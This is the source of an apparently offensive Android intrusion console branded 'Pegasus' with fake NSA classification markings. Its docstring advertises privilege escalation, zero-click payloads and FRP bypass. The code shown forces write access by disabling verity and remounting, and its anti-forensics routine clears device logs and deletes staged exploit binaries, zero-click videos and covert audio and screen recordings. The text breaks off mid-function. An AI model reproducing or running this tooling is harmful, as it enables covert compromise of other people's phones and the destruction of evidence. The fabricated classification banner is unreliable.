#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Pegasus v1.6 "INFEROR-Merged"

Developer : Trey A. Smith   |   Authenticated, Inc.   |   @ProjectZeroDays

Host-side Android console. USB / adb / adbh / mDNS / tcp-ip (alt ports,
USB bridge, adbd-TLS pairing) transports, fastboot driver, self-healing
settings write ladder, kernel LPE correlation engine, zero-click media,
HTTP/TCP callback listeners, anti-forensic wipe, guided FRP workflows,
validated WASM/MP4/GIF payload builders, embedded INFEROR stage and a
self-test / doctor suite.

Sidecar: paste the Q9 INFEROR blob into inferor.b85 next to this script
to enable the embedded stage (option 83); it is host-side Python.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import http.server
import io
import json
import marshal
import os
import platform
import random
import re
import shutil
import socket
import socketserver
import struct
import subprocess
import sys
import tempfile
import textwrap
import threading
import time
import urllib.request
import zipfile
import zlib
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from pathlib import Path

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    class _Dummy:
        def __getattr__(self, _name): return ""
    Fore = Style = _Dummy()                        # type: ignore


DEVELOPER = "Trey A. Smith"
COMPANY = "Authenticated, Inc."
HANDLE = "@ProjectZeroDays"

SCRIPT = Path(__file__).resolve()
WORKDIR = SCRIPT.parent
TOOLDIR = WORKDIR / "platform-tools"
OUTDIR = Path.home() / "pegasus_out"
STATE_DIR = Path.home() / ".pegasus"
TARGET_FILE = STATE_DIR / "target"
PEER_FILE = STATE_DIR / "peers"
PAIR_FILE = STATE_DIR / "paircode"
TOKEN_FILE = STATE_DIR / "token"
WRITE_FILE = STATE_DIR / "writemode"
PENDING_FILE = STATE_DIR / "pending"
VERITY_FILE = STATE_DIR / "verity_pending"
INFEROR_FILE = WORKDIR / "inferor.b85"
INFEROR_FILE2 = STATE_DIR / "inferor.b85"

VALID_KEY_HASH = "6e8bfe8bdf364b9aa18e25f75eca7672345764b5650d3fdfa12813722e3ca1e8"
WRITE_MODES = ("root", "shell")
PROBE_NS, PROBE_KEY = "global", "pegasus_probe"

IS_WIN = os.name == "nt"
IS_MAC = sys.platform == "darwin"
IS_LINUX = sys.platform.startswith("linux")

SERVER_VERBS = {"start-server", "kill-server", "devices", "connect", "disconnect",
                "pair", "mdns", "version", "reconnect", "keygen", "help",
                "wait-for-device", "start", "fork-server"}

LOGO = r"""
|========================================================================================|
|          CLASSIFIED // TOP SECRET // SI-G // TK // HCS // SAP-ALPHA // NOFORN          |
|========================================================================================|
|                                                                                        |
|         .d88188b.    .d8888b.              888b    888   .d8888b.         d8888        |
|        d88P"'"Y88;  d88'  '88;             8888b   888  d88'   Y88       d88888        |
|        888     888  888    888             88888b  888  Y88b.           d88'888        |
|        888     888  Y88b. ,888    88888    888Y88b 888   "Y888b.       d88' 888        |
|        888     888   "Y888P888    88888    888 Y88b888      "Y88b.    d88'  888        |
|        888 Y8b 888         888             888  Y88888        "888   d88'   888        | 
|        Y88b.Y8;88'  Y88.  ,88P             888   Y8888  Y88.  ,88P  d8888888888        |
|         "Y888888"    "Y8888P"              888    Y888   "Y8888P"  d88'     888        |
|               Y8b                                                                      |
|                                                                                        |
|========================================================================================|                                 
|                                                                                        |
|        TOP SECRET // SI-G // TK // HCS // SAP-ALPHA // NOFOR                           |
|        PROGRAM ALPHA — FUSION                                                          |
|        OSP — NATIONAL SECURITY AGENCY                                                  |
|                                                                                        |
|========================================================================================|

""".strip("\n")

ADB = ""
FB = ""
DEVICE = ""
SESSION = OUTDIR
WRITE_MODE = ""
AUTO_REBOOT = False
WIPE_ON_EXIT = True


# ---------------------------------------------------------------------
#  Presentation
# ---------------------------------------------------------------------
def width() -> int:
    try:
        cols = shutil.get_terminal_size((88, 24)).columns
    except Exception:                              # noqa: BLE001
        cols = 88
    return max(len(max(LOGO.splitlines(), key=len)) + 4, min(88, cols))


def rule():
    print(Fore.CYAN + Style.BRIGHT + "=" * width() + Style.RESET_ALL)


def section(title: str):
    print()
    rule()
    print(Fore.CYAN + title + Style.RESET_ALL)
    rule()
    print()


def ok(msg):   print(Fore.GREEN + f"[+] {msg}" + Style.RESET_ALL)
def warn(msg): print(Fore.YELLOW + f"[!] {msg}" + Style.RESET_ALL)
def err(msg):  print(Fore.RED + f"[-] {msg}" + Style.RESET_ALL)
def note(msg): print(Fore.WHITE + f"[*] {msg}" + Style.RESET_ALL)


def show_logo(clear=True):
    if clear:
        os.system("cls" if os.name == "nt" else "clear")
    print()
    for line in LOGO.splitlines():
        print(Fore.GREEN + Style.BRIGHT + line + Style.RESET_ALL)


def pause():
    print()
    input(Fore.CYAN + "press ENTER to continue..." + Style.RESET_ALL)


class Progress:
    SPIN = "|/-\\"

    def __init__(self, label: str, total: int = 1, size: int = 24):
        self.label = label
        self.total = max(int(total), 1)
        self.count = 0
        self.size = size

    def __enter__(self):
        self._draw()
        return self

    def __exit__(self, *_exc):
        self.finish()

    def step(self, note: str = ""):
        self.count += 1
        self._draw(note)

    def _draw(self, note: str = ""):
        pct = min(100, int(100 * self.count / self.total))
        filled = min(self.size, int(self.size * self.count / self.total))
        bar = "#" * filled + "-" * (self.size - filled)
        frame = self.SPIN[self.count % len(self.SPIN)]
        line = f"\r  {frame} {self.label:<22} [{bar}] {pct:3d}%"
        if note:
            line += f"  {note[:22]}"
        sys.stdout.write(line + "\033[K")
        sys.stdout.flush()

    def finish(self):
        if self.count < self.total:
            self.count = self.total
        self._draw()
        sys.stdout.write("\n")
        sys.stdout.flush()


# ---------------------------------------------------------------------
#  Pure helpers (from Q9)
# ---------------------------------------------------------------------
def text_escape(s):
    return (s or "").replace(" ", "%s")


def parse_target(tgt, default_port=5555):
    if not tgt:
        return None, default_port
    host, _, port = tgt.partition(":")
    return host, int(port) if port.isdigit() else default_port


def wifi_payload(ssid, password):
    esc = lambda s: re.sub(r"([\\;,\":])", r"\\\1", s)
    if password:
        return f"WIFI:T:WPA;S:{esc(ssid)};P:{esc(password)};H:false;;"
    return f"WIFI:T:nopass;S:{esc(ssid)};H:false;;"


def pair_payload(port, code):
    return f"WIFI:T:ADB;S:qandroid-{port};P:{code};;"


def host_ssid():
    """Current Wi-Fi SSID of the host, for the FRP QR workflow."""
    try:
        if IS_WIN:
            m = re.search(r"^\s*SSID\s*:\s*(.+)$",
                         _run(["netsh", "wlan", "show", "interfaces"], timeout=15)[1], re.M)
            if m:
                return m.group(1).strip()
        elif IS_MAC:
            m = re.search(r"Current Wi-Fi Network: (.+)",
                         _run(["networksetup", "-getairportnetwork", "en0"], timeout=15)[1])
            if m:
                return m.group(1).strip()
        elif IS_LINUX:
            out = _run(["iwgetid", "-r"], timeout=10)[1]
            if out.strip():
                return out.strip()
    except Exception:                              # noqa: BLE001
        pass
    return None


def render_qr_ascii(text):
    try:
        import qrcode  # type: ignore
        q = qrcode.QRCode(border=1)
        q.add_data(text)
        q.make()
        buf = io.StringIO()
        q.print_ascii(out=buf, invert=True)
        return buf.getvalue()
    except Exception:                              # noqa: BLE001
        return None


def save_qr_png(text, path):
    try:
        import qrcode  # type: ignore
        q = qrcode.QRCode(border=2)
        q.add_data(text)
        q.make(fit=True)
        q.make_image().save(str(path))
        return True
    except Exception:                              # noqa: BLE001
        return False


# ---------------------------------------------------------------------
#  Tool resolution (Pegasus walk + Q9 Locator/validation/pkgmgr)
# ---------------------------------------------------------------------
PLATFORM_ZIPS = {
    "windows": "platform-tools-latest-windows.zip",
    "darwin": "platform-tools-latest-darwin.zip",
    "linux": "platform-tools-latest-linux.zip",
}
REPO = "https://dl.google.com/android/repository/"

ADB_PKGS = {
    "windows": {"winget": ["Google.PlatformTools"], "choco": ["adb"], "scoop": ["adb"]},
    "macos": {"brew": ["android-platform-tools"]},
    "linux": {"apt-get": ["adb", "android-tools-adb"], "dnf": ["android-tools"],
              "yum": ["android-tools"], "pacman": ["android-tools"],
              "zypper": ["android-tools"], "apk": ["android-tools"]},
}


def _os_key():
    return "windows" if IS_WIN else "macos" if IS_MAC else "linux" if IS_LINUX else "other"


def _exe(name: str) -> str:
    return f"{name}.exe" if IS_WIN else name


def _pkg_cmd(manager, pkgs):
    return {
        "winget": ["winget", "install", "--silent", "--accept-package-agreements",
                   "--accept-source-agreements", "--disable-interactivity", *pkgs],
        "choco": ["choco", "install", "-y", "--no-progress", *pkgs],
        "scoop": ["scoop", "install", *pkgs],
        "brew": ["brew", "install", *pkgs],
        "apt-get": ["sudo", "apt-get", "install", "-y", "-q", *pkgs],
        "dnf": ["sudo", "dnf", "install", "-y", "-q", *pkgs],
        "yum": ["sudo", "yum", "install", "-y", "-q", *pkgs],
        "pacman": ["sudo", "pacman", "-S", "--noconfirm", "--needed", *pkgs],
        "zypper": ["sudo", "zypper", "--non-interactive", "install", *pkgs],
        "apk": ["sudo", "apk", "add", "--no-cache", *pkgs],
    }.get(manager, [manager, *pkgs])


def _managers():
    names = ("winget", "choco", "scoop") if IS_WIN else ("brew",) if IS_MAC \
        else ("apt-get", "dnf", "yum", "pacman", "zypper", "apk")
    return [m for m in names if shutil.which(m)]


def _valid_adb(path) -> bool:
    if not path or not os.path.isfile(path):
        return False
    rc, out, e = _run([path, "version"], timeout=20)
    return rc == 0 and "android debug bridge" in (out + e).lower()


def search_tool(name: str) -> list[str]:
    exe = _exe(name)
    hits: list[str] = []
    on_path = shutil.which(name)
    if on_path:
        note(f"PATH: {on_path}")
        hits.append(on_path)
    dirs = [TOOLDIR, WORKDIR]
    if IS_WIN:
        dirs += [r"C:\platform-tools", r"C:\adb",
                 r"C:\Program Files\platform-tools",
                 r"C:\Program Files (x86)\platform-tools",
                 os.path.expandvars(r"%LOCALAPPDATA%\Android\Sdk\platform-tools"),
                 os.path.expandvars(r"%USERPROFILE%\AppData\Local\Android\Sdk\platform-tools"),
                 os.path.expandvars(r"%USERPROFILE%\scoop\apps\adb\current"),
                 os.path.expandvars(r"%USERPROFILE%\scoop\shims"),
                 r"C:\ProgramData\chocolatey\bin"]
    else:
        dirs += ["/usr/bin", "/usr/local/bin", "/opt/platform-tools",
                 "/opt/homebrew/bin", "/usr/local/opt/android-platform-tools/bin",
                 os.path.expanduser("~/Android/Sdk/platform-tools"),
                 os.path.expanduser("~/.local/bin")]
    for env in ("ANDROID_HOME", "ANDROID_SDK_ROOT", "ADB_PATH"):
        root = os.environ.get(env)
        if root:
            dirs += [os.path.join(root, "platform-tools"), root]
    for folder in dirs:
        candidate = Path(folder) / exe
        if candidate.is_file():
            note(f"found: {candidate}")
            hits.append(str(candidate))
    for pattern in ("*/Android/Sdk/platform-tools", "*/AppData/Local/Android/Sdk/platform-tools"):
        try:
            for match in Path.home().glob(pattern):
                candidate = match / exe
                if candidate.is_file():
                    note(f"glob: {candidate}")
                    hits.append(str(candidate))
        except OSError:
            pass
    seen: set[str] = set()
    return [h for h in hits if not (h in seen or seen.add(h))]


def _download_platform_tools() -> str:
    key = _os_key()
    archive = PLATFORM_ZIPS.get("darwin" if key == "macos" else key)
    if not archive:
        return ""
    url = REPO + archive
    note(f"downloading {archive}")
    target = WORKDIR / archive
    try:
        with urllib.request.urlopen(url, timeout=60) as response:   # noqa: S310
            total = int(response.headers.get("Content-Length") or 0)
            with Progress("platform-tools", max(total // 8192, 1)) as bar:
                with target.open("wb") as handle:
                    while True:
                        chunk = response.read(8192)
                        if not chunk:
                            break
                        handle.write(chunk)
                        bar.step()
    except Exception as exc:                       # noqa: BLE001
        warn(f"download failed: {exc}")
        return ""
    ok(f"saved {target.name} ({target.stat().st_size // 1024} KB)")
    try:
        with zipfile.ZipFile(target) as zf:
            zf.extractall(WORKDIR)
    except Exception as exc:                       # noqa: BLE001
        err(f"extract failed: {exc}")
        return ""
    finally:
        try:
            target.unlink()
        except OSError:
            pass
    if not IS_WIN:
        for binary in ("adb", "fastboot"):
            path = TOOLDIR / binary
            if path.is_file():
                path.chmod(0o755)
    return str(TOOLDIR)


def _install_adb_pkgmgr() -> str:
    table = ADB_PKGS.get(_os_key(), {})
    for manager in _managers():
        pkgs = table.get(manager)
        if not pkgs:
            continue
        note(f"installing adb via {manager}")
        rc, out, e = _run(_pkg_cmd(manager, pkgs), timeout=900)
        if rc == 0:
            found = search_tool("adb")
            for hit in found:
                if _valid_adb(hit):
                    return hit
        else:
            warn(f"{manager}: {(out + e).strip()[-100:]}")
    return ""


def resolve_tools() -> None:
    global ADB, FB
    section("ADB RESOLUTION")
    found = [h for h in search_tool("adb") if _valid_adb(h)] or search_tool("adb")
    if not found:
        warn("adb not found anywhere - installing")
        if input("  install platform-tools? [Y/n]: ").strip().lower() != "n":
            root = _download_platform_tools()
            if not root:
                root = _install_adb_pkgmgr()
            if root:
                ok(f"installed into {root}")
                found = [h for h in search_tool("adb") if _valid_adb(h)]
            else:
                err("automatic install failed")
                note("manual: https://developer.android.com/tools/releases/platform-tools")
    ADB = found[0] if found else ""
    if ADB:
        rc, out, _ = _run([ADB, "version"], timeout=15)
        ok(f"adb: {ADB}")
        if rc == 0 and out.strip():
            note(out.splitlines()[0])
    else:
        err("adb unresolved - most options will be dead")

    section("FASTBOOT RESOLUTION")
    found_fb = search_tool("fastboot")
    if found_fb:
        FB = found_fb[0]
        ok(f"fastboot: {FB}")
    else:
        warn("fastboot not found - flash options will be unavailable")
        note("it ships in the same platform-tools archive")


def ensure_python_deps() -> None:
    section("DEPENDENCIES")
    wanted = {"colorama": "colorama", "requests": "requests", "qrcode": "qrcode",
              "PIL": "Pillow", "llama_cpp": "llama-cpp-python"}
    missing = []
    for module, package in wanted.items():
        try:
            __import__(module)
            ok(f"{module} present")
        except ImportError:
            warn(f"{module} missing")
            missing.append(package)
    if not missing:
        return

    if _run([sys.executable, "-m", "pip", "--version"], timeout=60)[0] != 0:
        note("pip missing - bootstrapping")
        _run([sys.executable, "-m", "ensurepip", "--upgrade"], timeout=300)
        if _run([sys.executable, "-m", "pip", "--version"], timeout=60)[0] != 0:
            gp = WORKDIR / "get-pip.py"
            try:
                urllib.request.urlretrieve("https://bootstrap.pypa.io/get-pip.py", gp)
                _run([sys.executable, str(gp)], timeout=600)
            except Exception as exc:               # noqa: BLE001
                warn(f"pip bootstrap failed: {exc}")
        if _run([sys.executable, "-m", "pip", "--version"], timeout=60)[0] != 0:
            err("pip unavailable - install packages by hand")
            return

    note(f"optional packages: {', '.join(missing)}")
    if input("  pip install them? [y/N]: ").strip().lower() != "y":
        return
    with Progress("pip", len(missing)) as bar:
        for package in missing:
            cmd = [sys.executable, "-m", "pip", "install", "--upgrade",
                   "--no-input", package]
            rc, out, e = _run(cmd, timeout=1800)
            if rc != 0 and "externally-managed-environment" in (out + e):
                cmd.insert(5, "--break-system-packages")
                rc, out, e = _run(cmd, timeout=1800)
            (ok if rc == 0 else warn)(package)
            bar.step()


# ---------------------------------------------------------------------
#  adb / fastboot plumbing  (-s injection keeps multi-device sane)
# ---------------------------------------------------------------------
def _run(cmd, timeout=90, binary=False):
    try:
        p = subprocess.run(cmd, capture_output=True, timeout=timeout)
        out = p.stdout if binary else p.stdout.decode("utf-8", "replace")
        errs = "" if binary else p.stderr.decode("utf-8", "replace")
        return p.returncode, out, errs
    except subprocess.TimeoutExpired:
        return 124, (b"" if binary else ""), "timeout"
    except FileNotFoundError as exc:
        return 127, (b"" if binary else ""), str(exc)


def _adb_cmdline(args: list) -> list:
    args = [str(a) for a in args]
    if DEVICE and args and args[0] not in SERVER_VERBS and "-s" not in args:
        return ["-s", DEVICE] + args
    return args


def adb(*args, timeout=90, binary=False):
    if not ADB:
        return 127, (b"" if binary else ""), "adb not found"
    return _run([ADB] + _adb_cmdline(list(args)), timeout=timeout, binary=binary)


def fb(*args, timeout=120, binary=False):
    if not FB:
        return 127, (b"" if binary else ""), "fastboot not found"
    args = [str(a) for a in args]
    if DEVICE and args and "-s" not in args:
        args = ["-s", DEVICE] + args
    return _run([FB] + args, timeout=timeout, binary=binary)


def shell(cmd, timeout=120):
    return adb("shell", cmd, timeout=timeout)


def pull(remote: str, local: Path) -> bool:
    local.parent.mkdir(parents=True, exist_ok=True)
    rc, _, e = adb("pull", remote, str(local), timeout=300)
    if rc != 0:
        err(f"pull {remote}: {e.strip()[:120]}")
        return False
    ok(f"pulled -> {local}")
    return True


def push(local: Path, remote: str) -> bool:
    rc, _, e = adb("push", str(local), remote, timeout=300)
    if rc != 0:
        err(f"push: {e.strip()[:120]}")
        return False
    ok(f"pushed -> {remote}")
    return True


def devices() -> list:
    rc, out, _ = adb("devices")
    if rc != 0:
        return []
    rows = []
    for line in out.splitlines()[1:]:
        parts = line.split()
        if len(parts) >= 2 and parts[1] in ("device", "unauthorized", "offline"):
            rows.append((parts[0], parts[1]))
    return rows


def need() -> bool:
    if not DEVICE:
        err("no device attached - use option 1, 2, 5 or 82")
        return False
    return True


def need_fb() -> bool:
    if not FB:
        err("fastboot not resolved - rerun from a fresh start")
        return False
    rc, out, _ = fb("devices")
    if not (out or "").strip():
        err("no fastboot device - use option 32 first")
        return False
    return True


def stamp(name: str, ext: str) -> Path:
    SESSION.mkdir(parents=True, exist_ok=True)
    return SESSION / f"{name}_{datetime.now():%Y%m%d_%H%M%S}.{ext}"


def save(name: str, text: str) -> Path:
    path = stamp(name, "txt")
    path.write_text(text, encoding="utf-8")
    ok(f"saved -> {path}")
    return path


def _device_root() -> bool:
    return shell("su -c id -u")[1].strip() == "0"


def _ffmpeg() -> str:
    return shutil.which("ffmpeg") or ""


def _ask_file(prompt: str):
    raw = input(prompt).strip().strip('"')
    if not raw:
        return None
    path = Path(raw)
    if not path.is_file():
        err(f"no such file: {path}")
        return None
    return path


def _screenshot_bytes():
    """exec-out first, then the sh screencap + pull fallback."""
    rc, data, e = adb("exec-out", "screencap -p", binary=True, timeout=60)
    if rc == 0 and isinstance(data, bytes) and data.startswith(b"\x89PNG"):
        return data
    shell("screencap -p /data/local/tmp/_s.png")
    rc2, d2, e2 = adb("pull", "/data/local/tmp/_s.png",
                      str(Path(tempfile.gettempdir()) / "_s.png"), timeout=60)
    shell("rm -f /data/local/tmp/_s.png")
    if rc2 == 0 and d2:
        return (Path(tempfile.gettempdir()) / "_s.png").read_bytes()
    return None


# ---------------------------------------------------------------------
#  Self-healing settings writer
# ---------------------------------------------------------------------
def _readback(namespace: str, key: str) -> str:
    return shell(f"settings get {namespace} {key}")[1].strip()


def _probe_write() -> bool:
    value = str(int(time.time()))
    shell(f"settings put {PROBE_NS} {PROBE_KEY} {value}")
    return _readback(PROBE_NS, PROBE_KEY) == value


def _dedupe(namespace: str, key: str, value: str) -> None:
    uri = f"content://settings/{namespace}"
    out = shell(f'content query --uri {uri} --where "name=\'{key}\'"')[1]
    if out.count(f"name={key}") <= 1:
        return
    shell(f'content delete --uri {uri} --where "name=\'{key}\'"')
    shell(f"content insert --uri {uri} --bind name:s:{key} --bind value:s:{value}")
    note(f"{key} de-duplicated")


def _escalate() -> str:
    global WRITE_MODE
    if _device_root():
        WRITE_MODE = "root"
        return WRITE_MODE

    rc, out, _ = adb("root", timeout=30)
    blob = (out or "").lower()
    if "restarting" in blob or "already" in blob:
        for _ in range(6):
            time.sleep(0.8)
            if _device_root():
                WRITE_MODE = "root"
                return WRITE_MODE
    if "cannot run as root" in blob:
        note("production build - adb root refused")

    verity = shell("getprop ro.boot.veritymode")[1].strip().lower()
    if verity == "disabled":
        rc, out, e = adb("remount", timeout=90)
        if "succeeded" in (out + e).lower():
            ok("remounted rw")
    elif verity in ("enforcing", ""):
        note("verity enforcing - attempting disable")
        rc, out, e = adb("disable-verity", timeout=90)
        blob = (out + e).lower()
        if "disabled" in blob or "successfully" in blob:
            try:
                STATE_DIR.mkdir(parents=True, exist_ok=True)
                VERITY_FILE.write_text("1\n", encoding="utf-8")
            except OSError:
                pass
            ok("verity disabled")
            if AUTO_REBOOT and input("  reboot now to apply? [Y/n]: ").strip().lower() != "n":
                adb("reboot")
        elif "cannot" in blob:
            warn(blob.strip()[:110])

    if not WRITE_MODE:
        WRITE_MODE = "shell"
    return WRITE_MODE


def _ensure_write_access(force: bool = False) -> str:
    global WRITE_MODE
    if WRITE_MODE and not force:
        return WRITE_MODE
    try:
        saved = WRITE_FILE.read_text(encoding="utf-8").strip()
    except OSError:
        saved = ""
    if saved in WRITE_MODES and not force:
        WRITE_MODE = saved
    if _device_root():
        WRITE_MODE = "root"
    elif force or not WRITE_MODE:
        _escalate()
    if not WRITE_MODE:
        WRITE_MODE = "shell"
    if WRITE_MODE == "root" and not _probe_write():
        warn("root shell but settings refuse - demoting to shell ladder")
        WRITE_MODE = "shell"
    try:
        STATE_DIR.mkdir(parents=True, exist_ok=True)
        WRITE_FILE.write_text(WRITE_MODE + "\n", encoding="utf-8")
    except OSError:
        pass
    return WRITE_MODE


def _setting_write(namespace: str, key: str, value: str, escalate: bool = True) -> bool:
    uri = f"content://settings/{namespace}"
    missing = _readback(namespace, key) in ("", "null")
    ladder = []
    if WRITE_MODE == "root" or _device_root():
        ladder.append(("su", f"su -c \"settings put {namespace} {key} {value}\""))
    ladder.append(("cmd", f"cmd settings put {namespace} {key} {value}"))
    if missing:
        ladder.append(("content-insert",
                       f"content insert --uri {uri} --bind name:s:{key} --bind value:s:{value}"))
    ladder.append(("settings", f"settings put {namespace} {key} {value}"))
    ladder.append(("content-update",
                   f"content update --uri {uri} --bind value:s:{value} "
                   f"--where \"name='{key}'\""))
    if not missing:
        ladder.append(("content-insert",
                       f"content insert --uri {uri} --bind name:s:{key} --bind value:s:{value}"))
    for label, cmd in ladder:
        shell(cmd)
        if _readback(namespace, key) == value:
            _dedupe(namespace, key, value)
            ok(f"{key} = {value}  ({label})")
            return True
        note(f"{label} -> {_readback(namespace, key) or 'empty'}")
    if escalate and WRITE_MODE != "root":
        note("escalating and retrying")
        _ensure_write_access(force=True)
        if WRITE_MODE == "root":
            return _setting_write(namespace, key, value, escalate=False)
    err(f"{key} refused by every path")
    return False


def _clear_package(pkg: str) -> bool:
    attempts = [f"pm clear --user 0 {pkg}", f"pm clear {pkg}"]
    if WRITE_MODE == "root" or _device_root():
        attempts.insert(0, f"su -c \"pm clear {pkg}\"")
    for cmd in attempts:
        rc, out, _ = shell(cmd, timeout=90)
        if "Success" in out:
            ok(f"cleared {pkg}")
            return True
    err(f"{pkg} not cleared")
    return False


def _persist_script(name: str, body: str):
    path = SESSION / f"{name}.sh"
    path.write_text("#!/system/bin/sh\n" + body, encoding="utf-8")
    remote = f"/sdcard/Download/{name}.sh"
    if push(path, remote):
        _register_pending(name)
        note(f"re-apply by hand: adb shell sh {remote}")
        return path
    return None


def _register_pending(name: str):
    try:
        STATE_DIR.mkdir(parents=True, exist_ok=True)
        names = set()
        if PENDING_FILE.exists():
            names = set(PENDING_FILE.read_text(encoding="utf-8").split())
        names.add(name)
        PENDING_FILE.write_text("\n".join(sorted(names)) + "\n", encoding="utf-8")
    except OSError:
        pass


def _pending_run():
    try:
        names = [n for n in PENDING_FILE.read_text(encoding="utf-8").split() if n]
    except OSError:
        return
    if not names:
        return
    note(f"auto re-applying {len(names)} queued script(s)")
    with Progress("re-apply", len(names)) as bar:
        for name in names:
            remote = f"/sdcard/Download/{name}.sh"
            rc, out, e = shell(f"sh {remote}", timeout=120)
            (ok if rc == 0 else warn)(f"{name}: {(out or e).strip()[:70]}")
            bar.step(name[:20])
    try:
        PENDING_FILE.unlink()
    except OSError:
        pass


def preflight():
    section("PREFLIGHT")
    if not DEVICE:
        warn("no device - write preflight skipped")
        return
    if VERITY_FILE.exists() and not _device_root():
        note("verity disable pending from last run - retrying remount")
        adb("remount", timeout=90)
    mode = _ensure_write_access()
    if mode == "root":
        ok("root writes available")
    elif _probe_write():
        ok("shell writes land - content ladder stands by")
    else:
        warn("settings locked - 55/56 will lean on content insert")
        note("option 53 prints the full picture")
    _pending_run()


# ---------------------------------------------------------------------
#  Anti-forensics - wipe target traces when the connection dies
# ---------------------------------------------------------------------
WIPE_CMDS = (
    "logcat -c",
    "logcat -b all -c",
    "rm -f /data/local/tmp/stage2.sh /data/local/tmp/stage2.wasm "
    "/data/local/tmp/dirty.c /data/local/tmp/dirty /data/local/tmp/dp.c /data/local/tmp/dp",
    "rm -rf /data/local/tmp/pegasus_stage",
    "rm -f /sdcard/Download/pegasus_*.sh /sdcard/Download/stage_bundle_*.zip "
    "/sdcard/Download/polyglot_*.gif",
    "rm -f /sdcard/DCIM/Camera/zeroclick_*.mp4 /sdcard/Movies/poc_*.mp4 "
    "/sdcard/Movies/pegasus_rec.mp4 /sdcard/pegasus_mic.m4a",
    "content delete --uri content://settings/global --where \"name='pegasus_probe'\"",
)


def _wipe_traces():
    if not DEVICE or not ADB:
        return
    section("ANTI-FORENSICS WIPE")
    with Progress("wipe", len(WIPE_CMDS)) as bar:
        for cmd in WIPE_CMDS:
            shell(cmd, timeout=60)
            bar.step()
    ok("logcat cleared, staged payloads, carriers and probe setting removed")


def f_wipe():
    section("WIPE TRACES NOW")
    if not need():
        return
    _wipe_traces()


# ---------------------------------------------------------------------
#  License
# ---------------------------------------------------------------------
def check_license(value: str) -> bool:
    if set(VALID_KEY_HASH) == {"0"}:
        return bool(value.strip())
    return hmac.compare_digest(hashlib.sha256(value.encode()).hexdigest(), VALID_KEY_HASH)


def cached_ok() -> bool:
    try:
        return hmac.compare_digest(TOKEN_FILE.read_text(encoding="utf-8").strip(), VALID_KEY_HASH)
    except OSError:
        return False


def cache_token():
    try:
        STATE_DIR.mkdir(parents=True, exist_ok=True)
        TOKEN_FILE.write_text(VALID_KEY_HASH + "\n", encoding="utf-8")
        TOKEN_FILE.chmod(0o600)
    except OSError:
        pass


# ---------------------------------------------------------------------
#  Crypto round-trip (Q9 toy KEM/signature - integrity selftest only)
# ---------------------------------------------------------------------
Q, N, K, L = 3329, 64, 3, 2


def _poly(): return [random.randrange(Q) for _ in range(N)]
def _mat(r, c): return [[_poly() for _ in range(c)] for _ in range(r)]


def _mul(a, b):
    o = [0] * N
    for i, ai in enumerate(a):
        if not ai:
            continue
        for j, bj in enumerate(b):
            o[(i + j) % N] = (o[(i + j) % N] + ai * bj) % Q
    return o


def _add(*vs):
    o = [0] * N
    for v in vs:
        for i in range(N):
            o[i] = (o[i] + v[i]) % Q
    return o


def _mv(m, v): return [_add(*[_mul(m[i][j], v[j]) for j in range(len(m[0]))]) for i in range(len(m))]
def _mvt(m, v): return [_add(*[_mul(m[r][c], v[r]) for r in range(len(m))]) for c in range(len(m[0]))]


def _hp(msg):
    d = hashlib.sha256(msg).digest()
    return [d[i % len(d)] % Q for i in range(N)]


def _b2p(b): return [x % Q for x in b[:N].ljust(N, b"\0")]
def _p2b(p): return bytes(x % 256 for x in p)


class KyberKEM:
    def keygen(self):
        A = _mat(K, L)
        s = [_poly() for _ in range(L)]
        return {"A": A, "s": s, "t": _mv(A, s)}

    def encapsulate(self, pk, msg=None):
        A, t = pk["A"], pk["t"]
        r = [_poly() for _ in range(K)]
        m = _b2p(msg if msg else os.urandom(N))
        u = _mvt(A, r)
        v = _add(*[_mul(t[i], r[i]) for i in range(K)], m)
        return {"u": u, "v": v,
                "ss": hashlib.sha256(_p2b(m) + b"".join(map(_p2b, u))).digest()}

    def decapsulate(self, sk, ct):
        m = _sub(ct["v"], *[_mul(sk["s"][i], ct["u"][i]) for i in range(L)])
        return hashlib.sha256(_p2b(m) + b"".join(map(_p2b, ct["u"]))).digest()


def _sub(*vs):
    o = list(vs[0])
    for v in vs[1:]:
        for i in range(len(o)):
            o[i] = (o[i] - v[i]) % Q
    return o


class DilithiumSignature:
    def keygen(self):
        A = _mat(K, L)
        s = [_poly() for _ in range(L)]
        return {"A": A, "s": s, "t": _mv(A, s)}

    def sign(self, sk, msg):
        c = _hp(msg)
        return {"c": c, "z": [_add(sk["s"][i], c) for i in range(L)]}

    def verify(self, pk, msg, sig):
        if sig["c"] != _hp(msg):
            return False
        lhs = _mv(pk["A"], sig["z"])
        rhs = [_add(pk["t"][k],
                   *[_mul(pk["A"][k][j], sig["c"]) for j in range(L)]) for k in range(K)]
        return lhs == rhs


def crypto_selftest():
    k = KyberKEM()
    kp = k.keygen()
    ct = k.encapsulate({"A": kp["A"], "t": kp["t"]}, b"secret")
    assert k.decapsulate(kp, ct) == ct["ss"], "KEM roundtrip"
    d = DilithiumSignature()
    dk = d.keygen()
    pk = {"A": dk["A"], "t": dk["t"]}
    sig = d.sign(dk, b"msg")
    assert d.verify(pk, b"msg", sig), "sig rejected"
    assert not d.verify(pk, b"bad", sig), "tampered accepted"
    return True


# ---------------------------------------------------------------------
#  Pager and docs
# ---------------------------------------------------------------------
PAGE_WIDTH = 70


def _fmt_line(line: str) -> str:
    if line.startswith("|"):
        return Fore.CYAN + "  " + line[1:] + Style.RESET_ALL
    if line.startswith("- "):
        return Fore.WHITE + textwrap.fill(line[2:], PAGE_WIDTH,
                                          initial_indent="  * ",
                                          subsequent_indent="    ") + Style.RESET_ALL
    if not line:
        return ""
    return textwrap.fill(line, PAGE_WIDTH, initial_indent="  ", subsequent_indent="  ")


def _nav_footer(idx: int, total: int) -> str:
    left = f"<-{max(0, idx - 1)}. Previous Page" if idx > 1 else "<-. Previous Page"
    left = (Fore.YELLOW + Style.BRIGHT if idx > 1 else Fore.CYAN + Style.DIM) + left + Style.RESET_ALL
    right = f"{idx + 1}. Next Page ->" if idx < total else ". Next Page ->"
    right = (Fore.YELLOW + Style.BRIGHT if idx < total else Fore.CYAN + Style.DIM) + right + Style.RESET_ALL
    llen = len(f"<-{max(1, idx - 1)}. Previous Page")
    rlen = len(f"{idx + 1}. Next Page ->")
    start = max(1, min(idx - 2, total - 4))
    window = list(range(start, min(total, start + 4) + 1))
    mid = [(Fore.GREEN + Style.BRIGHT if p == idx else Fore.CYAN) + str(p) + Style.RESET_ALL
           for p in window]
